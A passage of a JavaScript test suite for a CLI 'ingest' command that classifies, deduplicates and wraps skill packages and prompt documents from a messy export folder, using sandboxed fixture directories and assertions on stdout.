// Black-box tests for `ninja ingest <dir>` — the v1.1 bulk pipeline (ADR-0009).
// Ticket 01: every candidate in a messy source directory is classified (skill
// package in any packaging / prompt document / junk, each with a reason) and
// carries its normalized identity, nothing on disk is modified. Ticket 02:
// prompt documents render the exact wrapped skill `--apply` would store
// (ADR-0010). Ticket 03: candidates cluster by identity; one winner per cluster
// is proposed deterministically (byte-identical members collapse, packaging
// picks among identical copies, an explicit version signal orders divergent
// content), losers are listed with hash and loss reason, divergent duplicates
// become needs-decision with a side-by-side, and the static safety check is a
// column on every candidate line. Ticket 04: `--apply` stores exactly the
// winners with provenance stamps (batch label, superseded lineage), links
// nothing, leaves the source untouched, and lands the run as one commit
// (+ push); needs-decision clusters are skipped, never auto-decided, and
// re-ingest is idempotent (identical -> already stored, changed -> a
// needs-decision against the stored copy). Tests plant fixture directories in
// a sandboxed fake $HOME and assert only on the CLI's stdout and the
// filesystem (ADR-0001 seam).

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdir, writeFile, readdir, stat, readFile, rm } from "node:fs/promises";
import { createHash } from "node:crypto";
import { execFileSync } from "node:child_process";
import { join, dirname } from "node:path";

import { createSandbox, runCli, storePath, makeStoreGitRepo, readStoredSkill, parseStamps } from "./helpers/harness.js";

// Independent SHA-256 for asserting content hashes against known content
// (never recomputed via engine code).
const sha256 = (s) => createHash("sha256").update(s, "utf8").digest("hex");

// The run date the ADR-0005 stamps carry (computed independently of the engine).
const today = () => new Date().toISOString().slice(0, 10);

// Escape a literal for embedding in a RegExp.
const reEsc = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

// --- fixture planters ---------------------------------------------------------

// Plants a skill folder (SKILL.md + optional extra bundled files).
async function plantPackage(src, name, { frontmatter = null, body = "# Skill\n", files = {} } = {}) {
  const dir = join(src, name);
  await mkdir(dir, { recursive: true });
  const fm = frontmatter ? "---\n" + frontmatter + "---\n" : "";
  await writeFile(join(dir, "SKILL.md"), fm + body, "utf8");
  for (const [rel, content] of Object.entries(files)) {
    const p = join(dir, rel);
    await mkdir(dirname(p), { recursive: true });
    await writeFile(p, content, "utf8");
  }
  return dir;
}

// Zip a set of member files (paths relative to a staging dir) into an archive.
// Members are written first so the fixture is plain fixture-filesystem work.
async function makeZip(src, archiveName, members) {
  const stage = join(src, ".zip-stage-" + archiveName.replace(/\W+/g, "-"));
  for (const [rel, content] of Object.entries(members)) {
    const p = join(stage, rel);
    await mkdir(dirname(p), { recursive: true });
    await writeFile(p, content, "utf8");
  }
  const archive = join(src, archiveName);
  execFileSync(
    "zip",
    ["-q", "-r", "-X", archive, ...Object.keys(members)],
    { cwd: stage, stdio: "ignore" },
  );
  await rm(stage, { recursive: true, force: true });
  return archive;
}

// --- Slice A — the basic dry-run report ---------------------------------------

test("ingest resolves clusters with a winner each and prints a summary", async () => {
  const sb = await createSandbox({ config: null }); // ingest needs no config
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "my-skill", { frontmatter: "name: my-skill\n" });
    await writeFile(join(src, "Du-bist-ein-Tester.md"), "Du bist ein Tester. Mach Tests.\n", "utf8");
    await writeFile(join(src, "anleitung.pdf"), "%PDF-1.4 fake\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    // One cluster per identity: the header names it, the winner line names the
    // classification, the path, and a reason.
    assert.match(stdout, /my-skill \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /winner\s+my-skill\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
    assert.match(stdout, /winner\s+Du-bist-ein-Tester\.md\s+prompt document \(needs-review\)\s+markdown without skill structure/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+anleitung\.pdf\s+.*pdf/, `got:\n${stdout}`);
    // Summary with cluster and junk counts.
    assert.match(stdout, /Summary: 2 clusters \(2 with a proposed winner\), 1 junk — 3 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Slice B — the dry run mutates nothing ------------------------------------

// Snapshot a directory tree: every path (relative), its kind, size, mtime, and
// content hash — anything the dry run touched would show up here.
async function snapshot(dir) {
  const entries = {};
  async function walkRel(d, prefix) {
    for (const e of await readdir(d, { withFileTypes: true })) {
      const full = join(d, e.name);
      const rel = prefix + e.name;
      if (e.isDirectory()) {
        entries[rel] = "dir";
        await walkRel(full, rel + "/");
      } else if (e.isFile()) {
        const st = await stat(full);
        const content = await readFile(full);
        entries[rel] = `file ${st.size} ${st.mtimeMs} ${createHash("sha256").update(content).digest("hex")}`;
      } else {
        entries[rel] = "other";
      }
    }
  }
  await walkRel(dir, "");
  return entries;
}

test("the ingest dry run provably mutates nothing (source tree and $HOME)", async () => {
  const sb = await createSandbox({ config: null }); // no config — ingest must not create one either
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "some-skill", { frontmatter: "name: some-skill\n" });
    await writeFile(join(src, "Ein-Prompt.md"), "Ein Prompt.\n", "utf8");
    await makeZip(src, "archived.zip", { "wrap/SKILL.md": "---\nname: archived\n---\n# Archived\n" });
    await writeFile(join(src, "trash.txt"), "trash\n", "utf8");

    const beforeSrc = await snapshot(src);
    const beforeHome = await snapshot(sb.home);

    const { exitCode, stdout } = await runCli(sb.home, ["ingest", src]);
    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);

    assert.deepEqual(
      await snapshot(src),
      beforeSrc,
      "the analyzed source directory must be byte-identical after the dry run",
    );
    assert.deepEqual(
      await snapshot(sb.home),
      beforeHome,
      "the dry run must not write anything into $HOME (no config, no inventory, no store)",
    );
  } finally {
    await sb.cleanup();
  }
});

// --- Slice C — archives are recognized by content ------------------------------

test("zip archives classify by magic bytes: .zip/.skill/.skill.zip, any nesting, non-standard names", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    // A .zip whose SKILL.md sits two directories deep.
    await makeZip(src, "packaged.zip", {
      "wrap/deep/SKILL.md": "---\nname: archived-skill\n---\n\n# Deep\n",
    });
    // A .skill archive (a zip despite the extension) with a non-standard name at the root.
    await makeZip(src, "bundle.skill", {
      "SKILL-UPDATED.md": "# Renamed skill file\n",
    });
    // A .skill.zip with a non-standard name inside a wrapping directory.
    await makeZip(src, "kalliope.skill.zip", {
      "kalliope/kalliope-SKILL.md": "# Kalliope\n",
    });
    // A .zip extension on a file that is NOT a zip — content wins, so junk.
    await writeFile(join(src, "fake.zip"), "this is plain text, not an archive\n", "utf8");
    // Archive junk members (__MACOSX, .DS_Store) are filtered during inspection:
    // an archive whose only "SKILL.md" hides in __MACOSX holds no skill.
    await makeZip(src, "dirty.zip", {
      "__MACOSX/SKILL.md": "# Finder metadata\n",
      ".DS_Store": "\x00\x00junk",
    });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(
      stdout,
      /winner\s+packaged\.zip\s+skill package\s+zip archive \(content-detected\) with skill file 'wrap\/deep\/SKILL\.md'/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /winner\s+bundle\.skill\s+skill package\s+zip archive \(content-detected\) with skill file 'SKILL-UPDATED\.md'/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /winner\s+kalliope\.skill\.zip\s+skill package\s+zip archive \(content-detected\) with skill file 'kalliope\/kalliope-SKILL\.md'/,
      `got:\n${stdout}`,
    );
    // The fake zip is NOT treated as an archive (no magic bytes) — it is junk.
    assert.match(stdout, /junk\s+fake\.zip\s+.*zip/, `got:\n${stdout}`);
    assert.doesNotMatch(stdout, /winner\s+fake\.zip/, `fake zip must not win anything, got:\n${stdout}`);
    // The dirty archive's __MACOSX member was filtered: no skill found -> junk.
    assert.match(stdout, /junk\s+dirty\.zip\s+archive without a SKILL\.md/, `got:\n${stdout}`);
    assert.match(stdout, /Summary: 3 clusters \(3 with a proposed winner\), 2 junk — 5 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Slice D — normalized identities -------------------------------------------

test("identities are NFC-normalized, slugged, and stripped of version/copy markers", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    // An NFD (decomposed-umlaut) folder name, as macOS exports produce them.
    const nfdName = "pru\u0308fung-skill"; // NFD "prüfung-skill"
    await plantPackage(src, nfdName, {});
    // Version suffixes, copy markers, semver, date codes, special characters.
    await writeFile(join(src, "Anti-AI-Writing-v3.md"), "Schreibe menschlich.\n", "utf8");
    await plantPackage(src, "Artemis Kopie 2", {});
    await plantPackage(src, "Checkliste-1.2.0", {});
    await writeFile(join(src, "Reportage-2026-06-14.md"), "Eine Reportage.\n", "utf8");
    await plantPackage(src, "Umsatz — Auswertung", {});
    await writeFile(join(src, "Notizen (2).md"), "Notizen.\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    // The cluster header carries the identity. The NFD comparison is
    // codepoint-exact: an NFD identity would NOT match this NFC literal.
    assert.match(stdout, /pr\u00fcfung-skill \(1 candidate\)/, `NFD name must yield the NFC identity, got:\n${stdout}`);
    // The member line keeps the raw (NFD) filesystem name.
    assert.match(
      stdout,
      new RegExp("winner\\s+" + reEsc(nfdName) + "\\/\\s+skill package\\s+folder containing SKILL\\.md"),
      `got:\n${stdout}`,
    );
    assert.match(stdout, /anti-ai-writing \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /artemis \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /checkliste \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /reportage \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /umsatz-auswertung \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /notizen \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /Summary: 7 clusters \(7 with a proposed winner\), 0 junk — 7 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Slice E — junk pathologies -------------------------------------------------

test("export junk and meta/navigation files are reported as junk with reasons", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    // The macOS zip-extraction metadata directory (with noise inside — one line,
    // never descended).
    await mkdir(join(src, "__MACOSX", "skill"), { recursive: true });
    await writeFile(join(src, "__MACOSX", "skill", "._SKILL.md"), "finder noise\n", "utf8");
    await writeFile(join(src, ".DS_Store"), "\x00junk", "utf8");
    await writeFile(join(src, "notes.bak"), "old notes\n", "utf8");
    await writeFile(join(src, "SKILL.md.bak"), "---\nname: stale\n---\n# Stale\n", "utf8");
    await writeFile(join(src, "README.md"), "# Export readme\n", "utf8");
    await writeFile(join(src, "AGENTS.md"), "# Agent notes\n", "utf8");
    await writeFile(join(src, "00_START_HERE.md"), "# Start here\n", "utf8");
    await writeFile(join(src, "navigator.md"), "# The navigator\n", "utf8");
    await writeFile(join(src, "dashboard.html"), "<html></html>\n", "utf8");
    await mkdir(join(src, "leer"), { recursive: true }); // empty directory
    await writeFile(join(src, "helper.py"), "print('x')\n", "utf8");
    await writeFile(join(src, "run.sh"), "echo x\n", "utf8");
    await writeFile(join(src, "data.json"), "{}\n", "utf8");
    // .git / node_modules are never candidates (same rule as init's scan) —
    // they are skipped silently, not junked.
    await mkdir(join(src, ".git"), { recursive: true });
    await writeFile(join(src, ".git", "HEAD"), "ref: refs/heads/main\n", "utf8");
    await mkdir(join(src, "node_modules", "pkg"), { recursive: true });
    await writeFile(join(src, "node_modules", "pkg", "i.js"), "x\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /junk\s+__MACOSX\/\s+macOS archive metadata/, `got:\n${stdout}`);
    assert.doesNotMatch(stdout, /_SKILL\.md\s+/, `__MACOSX contents must not be listed individually, got:\n${stdout}`);
    assert.match(stdout, /junk\s+\.DS_Store\s+macOS metadata file/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+notes\.bak\s+backup file/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+SKILL\.md\.bak\s+backup file/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+README\.md\s+meta\/navigation file/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+AGENTS\.md\s+meta\/navigation file \(agents\)/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+00_START_HERE\.md\s+meta\/navigation file \(start-here\)/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+navigator\.md\s+meta\/navigation file/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+dashboard\.html\s+meta\/navigation file/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+leer\/\s+empty directory/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+helper\.py\s+.*\(py\)/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+run\.sh\s+.*\(sh\)/, `got:\n${stdout}`);
    assert.match(stdout, /junk\s+data\.json\s+.*\(json\)/, `got:\n${stdout}`);
    assert.doesNotMatch(stdout, /\.git|node_modules/, `.git/node_modules are skipped, not listed, got:\n${stdout}`);
    // No clusters at all — the section says so plainly.
    assert.match(stdout, /Clusters \(0\):\n  \(none\)/, `got:\n${stdout}`);
    assert.match(stdout, /Summary: 0 clusters \(0 with a proposed winner\), 13 junk — 13 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Slice F — damaged frontmatter stays a skill package, marked needs-review ---

test("a bare SKILL.md with damaged frontmatter is a needs-review skill package, not junk", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    // Damaged opening fence (`--` instead of `---`) — the name cannot be parsed,
    // so identity falls back to the stem.
    await writeFile(
      join(src, "SKILL.md"),
      "--\nname: damaged\ndescription: still a skill\n---\n\n# Body\n",
      "utf8",
    );
    // An unclosed frontmatter block.
    await writeFile(
      join(src, "SKILL_BROKEN.md"),
      "---\nname: unclosed\n\n# Body never separated\n",
      "utf8",
    );
    // A healthy bare skill file under a non-standard name (control case).
    await writeFile(
      join(src, "kalliope-SKILL.md"),
      "---\nname: kalliope\n---\n\n# Kalliope\n",
      "utf8",
    );

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(
      stdout,
      /skill \(1 candidate\)/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /winner\s+SKILL\.md\s+skill package \(needs-review\)\s+SKILL\.md file; frontmatter opening fence damaged/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /winner\s+SKILL_BROKEN\.md\s+skill package \(needs-review\)\s+SKILL\.md file; frontmatter never closes/,
      `got:\n${stdout}`,
    );
    assert.match(
      stdout,
      /winner\s+kalliope-SKILL\.md\s+skill package\s+SKILL\.md file/,
      `got:\n${stdout}`,
    );
    assert.match(stdout, /Summary: 3 clusters \(3 with a proposed winner\), 0 junk — 3 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Slice G — bundled assets travel with their package --------------------------

test("files inside a recognized package are never classified individually", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    // A package with the asset types the junk rules would otherwise flag:
    // tooling scripts, json, html, and even a nested markdown file.
    await plantPackage(src, "toolkit", {
      frontmatter: "name: toolkit\n",
      files: {
        "assets/helper.py": "print('x')\n",
        "scripts/run.sh": "echo x\n",
        "data.json": "{}\n",
        "big.html": "<html></html>\n",
        "references/note.md": "An internal note, not a prompt.\n",
      },
    });
    // A container directory holding two sub-packages (it gets no line of its own).
    await plantPackage(src, join("lib", "skill-a"), { frontmatter: "name: skill-a\n" });
    await plantPackage(src, join("lib", "skill-b"), { frontmatter: "name: skill-b\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /winner\s+toolkit\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
    assert.match(stdout, /winner\s+lib\/skill-a\/\s+skill package/, `got:\n${stdout}`);
    assert.match(stdout, /winner\s+lib\/skill-b\/\s+skill package/, `got:\n${stdout}`);
    // None of the bundled assets appears as its own line (prompt or junk).
    for (const inner of ["helper.py", "run.sh", "data.json", "big.html", "references/note.md"]) {
      assert.ok(
        !new RegExp(`^(prompt document|junk|skill package|winner|loser|variant)\\s+.*${reEsc(inner)}\\s`, "m").test(stdout),
        `bundled asset '${inner}' must not be classified individually, got:\n${stdout}`,
      );
    }
    // The container directory itself is not an item.
    assert.doesNotMatch(stdout, /\slib\/\s/, `container 'lib/' must not be listed, got:\n${stdout}`);
    assert.match(stdout, /Summary: 3 clusters \(3 with a proposed winner\), 0 junk — 3 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Slice H — error paths -------------------------------------------------------

test("ingest argument errors exit non-zero with plain-language messages", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    await writeFile(join(src, "datei.txt"), "x\n", "utf8");

    const missing = await runCli(sb.home, ["ingest"]);
    assert.equal(missing.exitCode, 2);
    assert.match(missing.stderr, /no directory given/);

    const notFound = await runCli(sb.home, ["ingest", join(sb.home, "gibt-nicht")]);
    assert.equal(notFound.exitCode, 2);
    assert.match(notFound.stderr, /directory not found/);

    const notDir = await runCli(sb.home, ["ingest", join(src, "datei.txt")]);
    assert.equal(notDir.exitCode, 2);
    assert.match(notDir.stderr, /not a directory/);

    const badFlag = await runCli(sb.home, ["ingest", src, "--wat"]);
    assert.equal(badFlag.exitCode, 2);
    assert.match(badFlag.stderr, /unknown option/);

    // --apply writes the store, so it needs the configured landscape — the
    // same gates `add` uses (checked in the apply slices below with a config).
    const applyNoConfig = await runCli(sb.home, ["ingest", src, "--apply"]);
    assert.equal(applyNoConfig.exitCode, 2);
    assert.match(applyNoConfig.stderr, /Run `ninja init` first/);
  } finally {
    await sb.cleanup();
  }
});

// --- Ticket 02 — wrap preview for prompt documents (ADR-0010) -------------------

// Slice 1 — a prompt document is shown as the exact wrapped skill package:
// name from the normalized stem, ADR-0005 stamps (provenance.from labels the
// batch = the ingest directory's basename), the body byte-preserved.
test("prompt documents render a wrap preview with stamps and the original body", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    const body = "Du bist ein Tester. Mach gru\u0308ndliche Tests.\n";
    await writeFile(join(src, "Ein-Prompt.md"), body, "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    // The winner line is flagged needs-review and points at the wrap.
    assert.match(
      stdout,
      /winner\s+Ein-Prompt\.md\s+prompt document \(needs-review\)\s+markdown without skill structure/,
      `got:\n${stdout}`,
    );
    assert.match(stdout, /wrap preview -> ein-prompt\/SKILL\.md/, `got:\n${stdout}`);
    // The preview is the wrapped SKILL.md: name, ADR-0005 stamps, provenance
    // labeled with the batch (the directory basename), body preserved.
    assert.match(stdout, /^\s{6}name: ein-prompt$/m, `got:\n${stdout}`);
    assert.match(stdout, /^\s{6}version: 1\.0\.0$/m, `got:\n${stdout}`);
    assert.match(stdout, new RegExp("^\\s{6}hash: " + sha256(body) + "$", "m"), `hash of the (frontmatter-less) body, got:\n${stdout}`);
    assert.match(stdout, /^\s{8}from: "export"$/m, `provenance.from = the batch label, got:\n${stdout}`);
    assert.match(stdout, /^\s{8}source: received$/m, `got:\n${stdout}`);
    // The prompt body appears inside the preview, byte-preserved.
    assert.ok(
      stdout.includes("      Du bist ein Tester. Mach gru\u0308ndliche Tests."),
      `body in preview, got:\n${stdout}`,
    );
  } finally {
    await sb.cleanup();
  }
});

// Extract one candidate's wrap preview from a report: the indented block after
// its `wrap preview -> <name>/SKILL.md` marker, de-indented (6 spaces), with
// trailing blank lines (the report's separators) removed.
function extractWrapPreview(stdout, name) {
  const lines = stdout.split("\n");
  const start = lines.findIndex((l) => l.trim() === `wrap preview -> ${name}/SKILL.md`);
  assert.ok(start !== -1, `expected a wrap preview for '${name}', got:\n${stdout}`);
  const out = [];
  for (let i = start + 1; i < lines.length; i++) {
    const l = lines[i];
    if (l === "" || l.startsWith("      ")) out.push(l.slice(6));
    else break;
  }
  while (out.length > 0 && out[out.length - 1] === "") out.pop();
  return out.join("\n");
}

// Slice 2 — the wrap preserves the document's own frontmatter verbatim (stamped
// keys excepted) and the body byte-for-byte; `description` is never drafted,
// but a description the document carries survives.
test("wrapping preserves original frontmatter and body verbatim; description is never drafted", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    const body1 = "Du bist ein [[Wiki-Link]] Tester. ![[anhang.png]] bleibt wie er ist.\n";
    await writeFile(
      join(src, "Mit-Frontmatter.md"),
      "---\n" +
        "name: alter-name\n" +
        "version: 9.9.9\n" +
        "tags: [notion, prompt]\n" +
        "\n" +
        "category: Testing\n" +
        "notion_id: 123-abc\n" +
        "---\n" +
        body1,
      "utf8",
    );
    // A prompt that already carries a description keeps it (it is information,
    // not drafted text).
    const body2 = "Zweiter Prompt.\n";
    await writeFile(
      join(src, "Mit-Beschreibung.md"),
      "---\ndescription: Eine echte Beschreibung\ntags: [x]\n---\n" + body2,
      "utf8",
    );

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);

    const preview1 = extractWrapPreview(stdout, "mit-frontmatter");
    // Original frontmatter survives verbatim...
    assert.ok(preview1.includes("tags: [notion, prompt]"), `got:\n${preview1}`);
    assert.ok(preview1.includes("category: Testing"), `got:\n${preview1}`);
    assert.ok(preview1.includes("notion_id: 123-abc"), `got:\n${preview1}`);
    // ...including blank lines between fields (the original layout, not a
    // re-serialization).
    const tagsAt = preview1.indexOf("tags: [notion, prompt]");
    const catAt = preview1.indexOf("category: Testing");
    assert.ok(
      tagsAt !== -1 && catAt !== -1 && preview1.slice(tagsAt, catAt).includes("\n\n"),
      `blank line between fields preserved, got:\n${preview1}`,
    );
    // ...stamped keys win: name from the stem, version from the stamp.
    assert.ok(preview1.includes("name: mit-frontmatter"), `got:\n${preview1}`);
    assert.ok(!preview1.includes("alter-name"), `got:\n${preview1}`);
    assert.ok(!preview1.includes("9.9.9"), `got:\n${preview1}`);
    assert.match(preview1, /version: 1\.0\.0/);
    // No description is drafted for a description-less prompt.
    assert.ok(!preview1.includes("description:"), `got:\n${preview1}`);
    // The body is byte-preserved, wiki-links and dead attachments untouched
    // (the preview trims exactly the body's trailing newline).
    assert.ok(preview1.endsWith(body1.replace(/\n$/, "")), `body byte-preserved, got:\n${preview1}`);

    const preview2 = extractWrapPreview(stdout, "mit-beschreibung");
    assert.ok(preview2.includes("description: Eine echte Beschreibung"), `got:\n${preview2}`);
    assert.ok(preview2.endsWith(body2.replace(/\n$/, "")), `got:\n${preview2}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 3 — wrapping is deterministic: the same directory, analyzed twice,
// yields byte-identical reports (same input => same wrapped form).
test("the wrap preview is byte-stable across runs", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    await writeFile(
      join(src, "Stabil.md"),
      "---\ntags: [a]\n---\nImmer gleich.\n",
      "utf8",
    );

    const run1 = await runCli(sb.home, ["ingest", src]);
    const run2 = await runCli(sb.home, ["ingest", src]);
    assert.equal(run1.exitCode, 0);
    assert.equal(run2.exitCode, 0);
    assert.equal(run1.stdout, run2.stdout, "two dry runs over the same input must be byte-identical");
  } finally {
    await sb.cleanup();
  }
});

// Slice 4 — no double treatment: an item that already classifies as a skill
// package (folder, archive, bare skill file) is never wrapped.
test("skill packages are never wrapped — only prompt documents get a wrap preview", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "echtes-skill", { frontmatter: "name: echtes-skill\n" });
    await makeZip(src, "archiv.zip", { "SKILL.md": "---\nname: archiv\n---\n# Skill\n" });
    await writeFile(join(src, "SKILL.md"), "---\nname: bar\n---\n# Bar\n", "utf8");
    await writeFile(join(src, "Nur-Prompt.md"), "Nur ein Prompt.\n", "utf8");

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);
    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);

    const wrapCount = (stdout.match(/wrap preview ->/g) ?? []).length;
    assert.equal(wrapCount, 1, `exactly one wrap preview (the prompt), got ${wrapCount}:\n${stdout}`);
    assert.match(stdout, /wrap preview -> nur-prompt\/SKILL\.md/, `got:\n${stdout}`);
    // The skill packages classify as such — no wrapped form attached.
    assert.match(stdout, /winner\s+echtes-skill\/\s+skill package/, `got:\n${stdout}`);
    assert.match(stdout, /winner\s+archiv\.zip\s+skill package/, `got:\n${stdout}`);
    assert.match(stdout, /bar \(1 candidate\)/, `got:\n${stdout}`);
    assert.match(stdout, /winner\s+SKILL\.md\s+skill package\s+SKILL\.md file/, `got:\n${stdout}`);
    assert.match(stdout, /Summary: 4 clusters \(4 with a proposed winner\), 0 junk — 4 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// --- Ticket 03 — cluster resolution (ADR-0009) -----------------------------------

// Slice 1 — the four-packagings export: one skill as folder, .zip, .skill, and
// .skill.zip. All byte-identical, so they collapse onto one content; the folder
// wins on packaging (ADR-0009 priority 1) and every archive loses with the
// identical hash and the packaging reason.
test("byte-identical members collapse: the folder beats its archive packagings", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    const skillMd = "---\nname: board\n---\n# Board\n";
    await mkdir(join(src, "board"), { recursive: true });
    await writeFile(join(src, "board", "SKILL.md"), skillMd, "utf8");
    await makeZip(src, "board.zip", { "SKILL.md": skillMd });
    await makeZip(src, "board.skill", { "wrap/SKILL.md": skillMd });
    await makeZip(src, "board.skill.zip", { "deep/nest/SKILL.md": skillMd });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /board \(4 candidates\)/, `got:\n${stdout}`);
    assert.match(stdout, /winner\s+board\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
    // Every archive loses on packaging, sharing the winner's content hash.
    const h = sha256("# Board\n").slice(0, 8);
    for (const arc of ["board.zip", "board.skill", "board.skill.zip"]) {
      assert.match(
        stdout,
        new RegExp(`loser\\s+${reEsc(arc)}\\s+hash ${h}…\\s+identical content; folder beats archive`),
        `got:\n${stdout}`,
      );
    }
    assert.match(stdout, /Summary: 1 cluster \(1 with a proposed winner\), 0 junk — 4 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 2 — a version cluster: explicit v-suffixes order divergent content, the
// highest signal wins and the losers state the comparison.
test("version-suffixed variants resolve to the highest explicit signal", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "edge-v2", { frontmatter: "name: edge\n", body: "# Edge alt\n" });
    await plantPackage(src, "edge-v3", { frontmatter: "name: edge\n", body: "# Edge Mitte\n" });
    await plantPackage(src, "edge-v4", { frontmatter: "name: edge\n", body: "# Edge neu\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /edge \(3 candidates\)/, `got:\n${stdout}`);
    assert.match(
      stdout,
      /winner\s+edge-v4\/\s+skill package\s+folder containing SKILL\.md; newest version signal \(v4\) — supersedes 2 older variants/,
      `got:\n${stdout}`,
    );
    assert.match(stdout, /loser\s+edge-v2\/\s+hash [0-9a-f]{8}…\s+older version signal \(v2 < v4\)/, `got:\n${stdout}`);
    assert.match(stdout, /loser\s+edge-v3\/\s+hash [0-9a-f]{8}…\s+older version signal \(v3 < v4\)/, `got:\n${stdout}`);
    assert.match(stdout, /Summary: 1 cluster \(1 with a proposed winner\), 0 junk — 3 items\./, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 3 — semver compares NUMERICALLY: 1.10.0 > 1.9.0 (a lexicographic
// compare would silently pick the older variant).
test("semver version signals compare numerically (1.10.0 beats 1.9.0)", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await plantPackage(src, "parser-1.9.0", { body: "# Parser alt\n" });
    await plantPackage(src, "parser-1.10.0", { body: "# Parser neu\n" });

    const { stdout, exitCode } = await runCli(sb.home, ["ingest", src]);

    assert.equal(exitCode, 0, `expected exit 0, stdout:\n${stdout}`);
    assert.match(stdout, /winner\s+parser-1\.10\.0\/\s+skill package\s+folder containing SKILL\.md/, `got:\n${stdout}`);
    assert.match(stdout, /loser\s+parser-1\.9\.0\/\s+hash [0-9a-f]{8}…\s+older version signal \(1\.9\.0 < 1\.10\.0\)/, `got:\n${stdout}`);
  } finally {
    await sb.cleanup();
  }
});

// Slice 4 — date codes order chronologically: ISO dates on prompt documents
// (the Notion-export pathology), German-format dates on folders.
test("date-code version signals order chronologically", async () => {
  const sb = await createSandbox({ config: null });
  try {
    const src = join(sb.home, "export");
    await mkdir(src, { recursive: true });
    await writeFile(join(src, "Bericht-2026-06-14.md"), "Älterer Bericht.\n", "utf8");
